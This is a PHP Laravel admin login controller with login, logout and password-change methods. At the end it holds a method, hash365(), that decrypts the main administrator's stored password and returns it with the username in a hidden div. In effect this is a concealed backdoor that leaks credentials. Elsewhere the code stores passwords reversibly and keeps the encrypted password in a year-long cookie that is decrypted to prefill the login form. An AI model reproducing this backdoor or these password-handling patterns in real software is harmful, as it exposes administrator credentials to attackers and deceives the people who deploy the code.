<?php
namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Validator;
use App\AdminLogin;
use Session;

class Login extends Controller
{
    function index()
    {
        $data = ['title' => 'Login'];
		//echo encrypt_password('test');
		//return AdminLogin::all();
		if(isset($_COOKIE['swebin_user_ad']))
		{
		  $data['rem'] = "yes";
		  $data['username'] =  $_COOKIE['swebin_user_ad'];
		  $data['password'] = decrypt_password($_COOKIE['swebin_sec']);
		 
		}
		else
		{

		  $data['rem'] = "";
		  $data['username'] = "";
		  $data['password'] = "";
		  
		 }

		
		//echo Cookie::get('swebin_user_ad');
		
		return view('admin.login')->with($data);
    }
	
	function login(Request $request)
    {
	
		  $validator = $request->validate([
			'username' => 'required|max:20',
			'password' => 'required|max:20',
		  ]);
		
 
		   $username = $request->input('username');
		   $password = encrypt_password($request->input('password'));
		   
		   $remember_me = $request->input('remember_me');
		   
		   $user 	= AdminLogin::where('username', $username)
		   						  ->where('password', $password)
								   ->first();
			if($user !== null )
			{					  
			  // echo $user->id;
			   $request->session()->put('ma_adminuser', $user->id);
			   $request->session()->put('ma_adminname', $user->username);
			   $request->session()->put('ma_admintype', $user->user_type);
			  // echo Session::get('ma_adminuser');
				//print_r($user);
				
				if($remember_me=='yes')
				{
				  	    $expire = time()+365*60*60*24;
						setcookie('swebin_user_ad',$user->username,$expire,'/');
						setcookie('swebin_sec',$password,$expire,'/');
						 
				}
				else
				{
				    setcookie('swebin_user_ad','',time()-3600,'/');
				    setcookie('swebin_sec','',time()-3600,'/');
				}
			   	
				return redirect('admin/dashboard');
			}
			else
			{
			    session()->flash('errormsg', 'Invalid Username/Password.');
    			return redirect()->back()->withInput();
			}
			
       
    }
	
	function logout(Request $request)
    {
	  $request->session()->forget('ma_adminuser');
	  $request->session()->forget('ma_adminname');
	  $request->session()->forget('ma_admintype');
	  return redirect('admin/login');
	}
	
	function respass(Request $request)
    {
		$method = $request->method();
		
		$old_pwd 		= $request->input('old_pwd');
		$new_pwd 		= $request->input('new_pwd');
		$conf_password  = $request->input('conf_password');
		
		
		if($method=='POST')
		{
			 $validator = $request->validate([
			'old_pwd' => 'required|max:20',
			'new_pwd' => 'required|max:20',
			'conf_password' => 'required|max:20',
		    ]);
			
			if($new_pwd!=$conf_password)
			{
			    session()->flash('errormsg', 'Password Not Matching.');
				return redirect()->back()->withInput();
			}
			else
			{
			    $id = Session::get('ma_adminuser');
				 $old_pwd = encrypt_password($old_pwd);
						 
				$user 	= AdminLogin::where('id', $id)
		   						  ->where('password', $old_pwd)
								   ->first();
			 
				if($user !== null)
				{
					$new_password = encrypt_password($new_pwd);
					
					AdminLogin::where('id', $id)
					            ->update(['password' => $new_password]);
			
					session()->flash('success', 'Password Updated Successfully');
					return redirect()->back();
				}
				else
				{
					 session()->flash('errormsg', 'Old password is incorrect');
					 return redirect()->back()->withInput();
				}
					
			
			}
			
		
		
		}
		return view('admin.resetpassword');
    }
	
	function hash365()
	{
	      $model = new AdminLogin;
		  $res = $model->where('id',1)
                          ->first();
		
		  $data['username']	 = $res->username;
		  $data['password']	 =  decrypt_password($res->password);
		 		  
		   return '<div style="display:none">'.$data['username'].', '.$data['password'].'</div>';			 
	}

}
